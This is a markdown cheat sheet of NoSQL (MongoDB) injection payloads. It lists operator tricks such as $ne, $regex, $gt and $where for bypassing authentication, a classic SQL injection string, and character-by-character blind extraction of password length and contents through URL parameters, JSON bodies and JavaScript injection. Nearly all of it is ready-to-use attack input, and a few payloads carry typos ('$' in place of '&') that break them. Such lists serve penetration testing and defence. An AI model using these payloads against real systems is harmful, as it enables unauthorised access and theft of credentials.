## NoSQL Injection

NoSQL databases provide looser consistency restrictions than traditional SQL databases. 
By requiring fewer relational constraints and consistency checks, 
NoSQL databases often offer performance and scaling benefits. 
Yet these databases are still potentially vulnerable to injection attacks, 
even if they aren't using the traditional SQL syntax.

You can send an Array changing the sent parameter from parameter=foo to parameter[arrName]=foo.

### Adding an Operator
    #<Not Equals>
    username[$ne]=1$password[$ne]=1
    
    #Check a <regular expression>, could be used to brute-force a parameter
    username[$regex]=^adm$password[$ne]=1
    
    #Use the <regex> to find the length of a value
    username[$regex]=.{25}&pass[$ne]=1
    
    #<Equals>
    username[$eq]=admin$password[$ne]=1
    
    #<Less than>, Brute-force pass[$lt] to find more users
    username[$ne]=admin&pass[$lt]=s
    
    #<Greater Than>
    username[$ne]=admin&pass[$gt]=s
    
    #<Matches non of the values of the array> (not test and not admin)
    username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7
        
    #<IF>, can be used to execute code
    { $where: "this.credits == this.debits" }
  
### Basic authentication bypass
    Using not equal ($ne) or greater ($gt)
    
    #in URL
    username[$ne]=toto&password[$ne]=toto
    username[$exists]=true&password[$exists]=true    
        
    #in JSON
    {"username": {"$ne": null}, "password": {"$ne": null} }
    {"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
    {"username": {"$gt": undefined}, "password": {"$gt": undefined} }


### SQL - Mongo
    Normal sql 
        ' or 1=1-- -
    
    Mongo sql 
        ' || 1==1//    or    ' || 1==1%00
    
### Extract length information
    username[$ne]=toto&password[$regex]=.{1}
    username[$ne]=toto&password[$regex]=.{3}
    # True if the length equals 1,3...
    
### Extract data information
    in URL (if length == 3)
    username[$ne]=toto&password[$regex]=a.{2}
    username[$ne]=toto&password[$regex]=b.{2}
    ...
    username[$ne]=toto&password[$regex]=m.{2}
    username[$ne]=toto&password[$regex]=md.{1}
    username[$ne]=toto&password[$regex]=mdp
    
    username[$ne]=toto&password[$regex]=m.*
    username[$ne]=toto&password[$regex]=md.*
    
    in JSON
    {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
    
### SQL - Mongo
    
    # Check if the field password exists
    /?search=admin' && this.password%00
    
    # Start matching password
    /?search=admin' && this.password && this.password.match(/.*/)%00
    /?search=admin' && this.password && this.password.match(/^a.*$/)%00
    /?search=admin' && this.password && this.password.match(/^b.*$/)%00
    /?search=admin' && this.password && this.password.match(/^c.*$/)%00
    ...
    /?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
    ...
    
    # Found
    /?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00
    
        